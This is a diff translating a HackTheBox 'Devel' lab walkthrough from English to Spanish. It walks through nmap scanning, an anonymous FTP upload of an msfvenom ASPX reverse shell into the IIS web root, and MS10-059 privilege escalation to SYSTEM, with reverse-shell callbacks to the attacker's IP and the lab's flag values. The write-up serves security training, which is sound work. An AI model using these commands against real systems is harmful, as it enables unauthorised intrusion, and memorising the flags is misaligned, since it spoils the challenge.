@@ -1,13 +1,13 @@
-# Devel (Easy · Windows)
+# Devel (Easy Windows)
 
 **Author:** Ph4n3s
-**Date:** 2026-10-23
+**Fecha:** 23/10/2026
 **IP:** 10.129.79.200
-**Difficulty:** Easy / Windows
+**Dificultad:** Easy / Windows
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
 ### 1.1 Ping
 
@@ -19,9 +19,9 @@ ping -c 1 10.129.79.200
 64 bytes from 10.129.79.200: icmp_seq=1 ttl=127 time=4212 ms
 ```
 
-With a TTL close to 128 we assume a Windows system (the very high response time is a one-off, probably caused by the load of spawning the machine).
+Con TTL cercano a 128 asumimos un sistema Windows (el tiempo de respuesta tan alto es puntual, probablemente por la carga del spawn de la máquina).
 
-### 1.2 Open port enumeration
+### 1.2 Enumeración de puertos abiertos
 
 ```
 nmap -p- --open -T4 --min-rate 5000 10.129.79.200
@@ -32,7 +32,7 @@ nmap -p- --open -T4 --min-rate 5000 10.129.79.200
 80/tcp open  http
 ```
 
-### 1.3 Technology enumeration
+### 1.3 Enumeración de tecnologías
 
 ```
 nmap -p 80,21 -sVC -T4 --min-rate 5000 -Pn 10.129.79.200
@@ -54,9 +54,9 @@ nmap -p 80,21 -sVC -T4 --min-rate 5000 -Pn 10.129.79.200
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-Two key facts: the FTP allows **anonymous login**, and that FTP shares the same root as the IIS web site (`aspnet_client`, `iisstart.htm`, `welcome.png` are exactly the default files of a freshly installed IIS site). That means any file we upload over FTP should also become accessible over HTTP.
+Dos datos clave: el FTP permite **login anónimo**, y ese FTP comparte la misma raíz que el sitio web IIS (`aspnet_client`, `iisstart.htm`, `welcome.png` son justo los archivos por defecto de un sitio IIS recién instalado). Eso significa que cualquier archivo que subamos por FTP debería quedar accesible también por HTTP.
 
-### 1.4 nmap vuln script
+### 1.4 Script vuln de nmap
 
 ```
 nmap -p 80,21 --script vuln -T4 --min-rate 5000 10.129.79.200
@@ -74,71 +74,71 @@ PORT   STATE SERVICE
 |     IDs:  CVE:CVE-2015-1635
 ```
 
-Nmap flags the machine as vulnerable to MS15-034, but that is usually a false positive on this version of IIS/HTTP.sys (it only allows reading kernel memory via `Range`, not executing code on its own). We do not pursue it: with the anonymous FTP access we already have a far more direct vector.
+Nmap marca la máquina como vulnerable a MS15-034, pero suele ser un falso positivo de esta versión de IIS/HTTP.sys (solo permite leer memoria del kernel vía `Range`, no ejecutar código por sí solo). No lo perseguimos: con el acceso anónimo de FTP ya tenemos un vector mucho más directo.
 
 ---
 
-## 2. Exploitation
+## 2. Explotación
 
-Since the anonymous FTP writes directly onto the IIS web root, the plan is to upload an **ASPX web shell** over FTP and execute it by visiting it over HTTP.
+Como el FTP anónimo escribe directamente sobre la raíz web de IIS, el plan es subir una **web shell en ASPX** por FTP y ejecutarla visitándola por HTTP.
 
-**Step 1 — Generate the payload** with `msfvenom`:
+**Paso 1 — Generar el payload** con `msfvenom`:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.120 LPORT=4444 -f aspx -o shell.aspx
 ```
 
-**Step 2 — Upload it over anonymous FTP:**
+**Paso 2 — Subirlo por FTP anónimo:**
 
 ```
 ftp 10.129.79.200
 > anonymous
-> (blank password)
+> (contraseña en blanco)
 ftp> put shell.aspx
 ```
 
-**Step 3 — Open a listener and trigger the shell:**
+**Paso 3 — Abrir listener y disparar la shell:**
 
 ```bash
 nc -lvnp 4444
 curl http://10.129.79.200/shell.aspx
 ```
 
-IIS runs the `.aspx` as ASP.NET code under the application pool, and we receive a reverse shell — but with very limited privileges (IIS service account, no permissions over the system).
+IIS ejecuta el `.aspx` como código ASP.NET bajo el pool de aplicación, y recibimos una shell inversa — pero con privilegios muy limitados (cuenta de servicio de IIS, sin permisos sobre el sistema).
 
 ---
 
-## 3. Privilege escalation
+## 3. Escalada de privilegios
 
-The system is an old, unpatched Windows version, so we look for a kernel-level privilege escalation exploit. Using the information from `systeminfo` (build version, installed hotfixes) you can use **Windows Exploit Suggester** to narrow down candidates, or `searchsploit` directly against the operating system.
+El sistema es una versión antigua de Windows sin parchear, así que buscamos un exploit de escalada de privilegios a nivel de kernel. Con la información de `systeminfo` (versión de build, hotfixes instalados) se puede usar **Windows Exploit Suggester** para acotar candidatos, o directamente `searchsploit` sobre el sistema operativo.
 
-The chosen exploit was **CVE-2010-2554 / MS10-059** ("Chimichurri"), which once compiled produces a binary (`MS10-059.exe`) capable of spawning a shell with `NT AUTHORITY\SYSTEM` privileges.
+El exploit elegido fue **CVE-2010-2554 / MS10-059** ("Chimichurri"), que compilado da un binario (`MS10-059.exe`) capaz de spawnear una shell con privilegios de `NT AUTHORITY\SYSTEM`.
 
-**Step 1 — Upload the exploit** over the same anonymous FTP, to the web root (`C:\inetpub\wwwroot`):
+**Paso 1 — Subir el exploit** por el mismo FTP anónimo, a la raíz web (`C:\inetpub\wwwroot`):
 
 ```
 ftp> put MS10-059.exe
 ```
 
-**Step 2 — Confirm it is on the server** from the shell we already have:
+**Paso 2 — Confirmar que está en el servidor** desde la shell ya obtenida:
 
 ```
 dir C:\inetpub\wwwroot
 ```
 
-**Step 3 — Open a second listener** (port 4445) and run the exploit, passing it our IP and port as parameters:
+**Paso 3 — Abrir un segundo listener** (puerto 4445) y ejecutar el exploit pasándole nuestra IP y puerto como parámetros:
 
 ```
 C:\inetpub\wwwroot\MS10-059.exe 10.10.16.120 4445
 ```
 
-The binary opens a new connection back to us, this time with a shell as `NT AUTHORITY\SYSTEM`.
+El binario abre una nueva conexión hacia nosotros, esta vez con una shell como `NT AUTHORITY\SYSTEM`.
 
 ---
 
-## 4. Post-exploitation
+## 4. Post-explotación
 
-With the system shell, we read both flags:
+Con la shell de sistema, leemos ambas flags:
 
 ```
 type C:\Users\Administrator\Desktop\root.txt
@@ -150,21 +150,21 @@ ROOT FLAG -> e84dbb08663ab19315472bfb585a6ede
 USER FLAG -> bcd649fa3811b0c77561b89f131b64e4
 ```
 
-![Devel machine owned on HackTheBox](devel-pwned.png)
+![Máquina Devel resuelta en HackTheBox](devel-pwned.png)
 
 ---
 
-## Quick summary
+## Resumen rápido
 
-**What the machine was:** a freshly installed IIS 7.5 with anonymous FTP pointing to the same web root — a default, unsecured configuration — on top of a Windows with no kernel patches.
+**Qué era la máquina:** un IIS 7.5 recién instalado con FTP anónimo apuntando a la misma raíz web — configuración por defecto sin asegurar — sobre un Windows sin parches de kernel.
 
-**Enumeration:** `nmap` → FTP (21) with anonymous login and HTTP (80) with IIS 7.5 → the FTP file structure matches the web root, a sign both share the same directory.
+**Enumeración:** `nmap` → FTP (21) con login anónimo y HTTP (80) con IIS 7.5 → la estructura de archivos del FTP coincide con la raíz web, señal de que ambos comparten directorio.
 
-**Exploitation:** generate an `.aspx` web shell with `msfvenom`, upload it over anonymous FTP and run it by visiting it over HTTP → reverse shell with low privileges (IIS service account).
+**Explotación:** se genera una web shell `.aspx` con `msfvenom`, se sube por FTP anónimo y se ejecuta visitándola por HTTP → reverse shell con privilegios bajos (cuenta de servicio de IIS).
 
-**Privilege escalation:** the unpatched operating system is vulnerable to a known kernel exploit (MS10-059 / CVE-2010-2554, "Chimichurri") → upload the binary over the same FTP, run it from the shell we already had → shell as `NT AUTHORITY\SYSTEM`.
+**Escalada de privilegios:** el sistema operativo, sin parchear, es vulnerable a un exploit de kernel conocido (MS10-059 / CVE-2010-2554, "Chimichurri") → se sube el binario por el mismo FTP, se ejecuta desde la shell ya obtenida → shell como `NT AUTHORITY\SYSTEM`.
 
-**Key concept learned:** when a file-upload service (FTP, in this case) shares a directory with a web service that executes code (IIS + ASP.NET), uploading any file is equivalent to achieving remote code execution — no software vulnerability is needed, only a bad permission configuration between services.
+**Concepto clave aprendido:** cuando un servicio de subida de archivos (FTP, en este caso) comparte directorio con un servicio web que ejecuta código (IIS + ASP.NET), subir cualquier archivo equivale a conseguir ejecución remota de código — no hace falta ninguna vulnerabilidad de software, solo una mala configuración de permisos entre servicios.
 
 ---
 
